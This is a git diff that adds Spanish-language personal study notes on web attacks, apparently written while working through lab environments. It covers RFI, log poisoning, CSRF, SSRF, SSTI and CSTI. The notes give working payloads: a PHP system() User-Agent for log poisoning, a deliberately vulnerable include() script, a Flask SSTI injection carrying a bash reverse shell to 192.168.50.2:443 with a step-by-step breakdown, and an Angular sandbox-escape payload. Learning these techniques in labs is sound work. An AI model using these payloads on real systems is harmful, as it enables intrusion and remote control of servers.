@@ -319,7 +319,7 @@ echo -n "cadena en base64" | base64 -d
 
 > los XXE tambien sirven para explotar SSRF
 
-# 4. LFI (local file inclusion)
+# 4. [[LFI]] (local file inclusion)
 ```php
 <?php
 	$filename = $_GET['filename'];
@@ -367,3 +367,155 @@ al convertir una cadena de base64 usando //filter/convert.iconv.UTF8.CSISO2022KR
 y al volverla a decodear en base 64 lo que pasa es que se agrega un nuevo caracter al principio de la cadena principal, entonces la idea es agregar caracteres especificos para lograr formar un comando en la terminal
 
 # 5. [[RFI]] (remote file inclusion)
+con la vulnerabilidad del plugin de wordpress gwolle se puede inyectar codigo local mediante esta URL
+```url
+http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
+```
+para poder explotar la vulnerabilidad 'allow_url_include' = "yes" en la configuracion de php.ini 
+
+> en /var/www/html es donde se ejecuta el codigo de la pagina de apache
+
+# 6. [[log poisoning]] (LFI -> RFE)
+se envenan los logs que estan en la carpeta /var/logs de la maquina que estoy atacando
+con el siguiente comando se puede intercambiar el header User-Agent por un codigo malicioso de php
+```bash
+curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
+```
+# 7. cross-site request forgery ([[CSRF]])
+en el **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
+en la peticion get de los usuarios si editamos la parte ?name="minombre" con nuestra cuenta propia se cambia en la pagina por que no hay validaciones adicionales
+
+si en el campo de mensajes copio la peticion GET para cambiar el nombre de usuario. Cuando otra persona lo abra, se va a cambiar su nombre en su cuenta (al que elijamos en la peticion http).
+se inyecta poniendo esto en el campo de mensaje con html
+```html
+<img src="http://www.seed-server.com/[la ruta de la peticion]" alt="image" width="1" height="1"/>
+```
+
+# 8. server-side request forgery([[SSRF]])
+con lsof -i:80 se verifican los puertos abiertos especificos
+hay que cambiar la configuracion en **/etc/php/8.1/apache2/php.ini** para cambiar la configuracion del servidor apache con "allow_url_include"
+
+buscar archivo sin locate:
+```bash
+root@1bb631cbf6e8:~# find / -name php.ini 2>/dev/null
+```
+en /var/www/html creo el archivo utility.php
+```php
+<?php
+	if(isset($_GET["url"])){
+		$url = 	$_GET["url"];
+		echo "\n [+] listing website content" . $url . "\n\n";
+		include($url);
+	}else{
+		echo "\n [!] is necessary to insert a valid url query"
+	}	
+?>
+```
+
+analizo que puertos hay abiertos en esta direccion URL:
+```bash
+wfuzz -c -t 200 -z range,1-65535 "http://127.17.0.2/utility.php?url=http://127.17.0.1:FUZZ"
+```
+se podria acceder al proceso de un puerto que no 
+deberia ser accedible
+
+tambien se podria hacer dirigiendome a la direccion IP de un dispositivo que este en la misma subred que al que estoy atacando directamente para acceder a tu puerto
+![[Pasted image 20260124061536.png]]
+creando la red con docker para simular esta situacion
+[[docker intro]]
+```bash
+docker network create --driver=bridge --subnet=10.10.0.0/24
+docker network ps # listara las redes de docker
+docker network connect network1 miContenedor
+```
+este ultimo comando va a crear una nueva interfaz en el contendor
+```bash
+curl "http://127.17.0.2/utility.php?url=http://10.10.0.3:7878"
+```
+# 9. server-side template injection ([[SSTI]])
+docker run -p 8089:8089 -d filiparc/ssti-fask-hacking-playground
+
+como esta corriendo flask por detras (python) puedo probar si el input esta sanitizado con: 
+{{ 7 * 7 }}
+![[Pasted image 20260124071323.png]]
+me deja inyectar:
+```python
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/192.168.50.2/443.0>%261"').read() }}
+```
+%26=& en url encoding 
+partes del comando:
+
+1. `bash -c "..."`
+`-c` le dice a Bash:
+> “Ejecutá el comando que viene como string”
+
+Es decir:
+- El Bash externo solo sirve para **interpretar el texto**
+- El comando real está dentro de las comillas
+
+2. `bash -i`
+Dentro del string se ejecuta otro Bash:
+- `bash` → inicia una nueva shell
+- `-i` → **modo interactivo**
+
+Modo interactivo significa:
+- Lee comandos desde `stdin`
+- Muestra prompts
+- Permite ejecución continua de órdenes
+ 
+ 3. `/dev/tcp/192.168.50.2/443`
+En Bash, `/dev/tcp/host/puerto` es un **pseudo-dispositivo** que:
+- Abre una **conexión TCP**
+- Funciona como si fuera un archivo
+- Permite leer y escribir datos por red
+
+No es un archivo real, es una **feature interna de Bash**.
+ 
+4. Redirecciones (`>`, `0>`, `&`)
+El comando usa **redirecciones de file descriptors**.
+Primero, limpiemos los escapes:
+- `%26` representa `&` (HTML encoding)
+- `%261` representa `&1`
+
+El comando real, sin encoding, es conceptualmente:
+
+`bash -i >& /dev/tcp/192.168.50.2/443 0>&1`
+
+5. Qué hace cada redirección
+###### `>& /dev/tcp/192.168.50.2/443`
+- Redirige **stdout (1)** y **stderr (2)**
+- Ambos se envían a la conexión TCP
+Todo lo que Bash imprime sale por la red.
+ 
+ `0>&1`
+- Redirige **stdin (0)**
+- Para que lea desde el mismo canal que stdout
+Resultado:
+- Entrada y salida usan la **misma conexión**`
+
+
+entonces con nc -nlvp 443 me puedo conectar a la bash del servidor
+# 10. client-side template injection ([[CSTI]])
+
+en algunas versiones de angular se puede inyectar en campos input scripts como el siguiente para (por ejemplo) mostrar una alerta:
+```js
+{{
+    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+    B=C(b,c,b);$evalAsync("
+    astNode=pop();astNode.type='UnaryExpression';
+    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+    astNode.argument={type:'Identifier',name:'foo'};
+    ");
+    m1=B($$asyncQueue.pop().expression,null,$root);
+    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+    $eval('a(b.c)');[].push.apply=a;
+}}
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.mdi
+
+# 11. [[padding oracle]]
